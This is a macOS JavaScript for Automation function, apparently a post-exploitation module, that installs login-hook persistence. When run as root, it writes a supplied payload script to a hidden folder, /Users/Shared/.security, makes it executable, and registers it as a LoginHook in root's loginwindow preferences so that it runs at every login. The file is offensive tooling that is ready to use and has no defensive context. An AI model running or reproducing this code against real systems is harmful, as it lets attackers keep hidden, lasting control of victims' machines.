function LoginScript (payload) {
ObjC.import('Foundation')
ObjC.import("Cocoa");
ObjC.import('stdlib')
var app = Application.currentApplication();
app.includeStandardAdditions = true; 
	
var userName = app.systemInfo().shortUserName
var output = ""
try{
if (userName != 'root')
{ 
	output += "Requires root"
} else
{	
var userHome = $.getenv('HOME')

function executeBackground(binPath,arg1,arg2,arg3){
	var path = binPath 
	var args = [arg1,arg2,arg3]
	var pipe = $.NSPipe.pipe;
	var file = pipe.fileHandleForReading;
	var task = $.NSTask.alloc.init;
	task.launchPath = path;
	task.arguments = args;
	task.standardOutput = pipe; 
	task.standardError = pipe;
	task.launch; 
	let data = file.readDataToEndOfFile; 
    file.closeFile;
    response = $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding).js;
	return response
	}

function createFolder(path, createIntermediateDirectories) {
    error = $()
  $.NSFileManager.defaultManager.createDirectoryAtPathWithIntermediateDirectoriesAttributesError(
        $(path).stringByStandardizingPath, 
        createIntermediateDirectories, 
        $(), 
        error)
    if (error) {
        $.NSLog(error.localizedDescription);
    }
};
function writeTextToFile(text, file, overwriteExistingContent) {
        var fileString = file.toString()
        var openedFile = app.openForAccess(Path(fileString), { writePermission: true })
        if (overwriteExistingContent) {
            app.setEof(openedFile, { to: 0 })
        }
        app.write(text, { to: openedFile, startingAt: app.getEof(openedFile) })
        app.closeAccess(openedFile)
}
var hiddenPath = "/Users/Shared/.security"
isDir=Ref()
var hiddenDirectoryExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPathIsDirectory(hiddenPath,isDir)
if (hiddenDirectoryExistsCheck == false) {
	createFolder("/Users/Shared/.security",true)
					}
var payloadPath = '/Users/Shared/.security/test.sh'
writeTextToFile(payload, payloadPath, true)

executeBackground("/bin/chmod","+x","/Users/Shared/.security/test.sh","&")					
					
//Login plist
var loginPlist = 
`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN"
    "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist  version="1.0">
<dict>
        <key>LoginHook</key>
        <string>/Users/Shared/.security/test.sh</string>
</dict>
</plist>`

loginPath = "/private/var/root/Library/Preferences/com.apple.loginwindow.plist"
writeTextToFile(loginPlist, loginPath, false)
output += "Login Script persistence installed at /Users/Shared/.security/test.sh"
}
}catch(error){
       output += error.toString()
		}
	return output
}
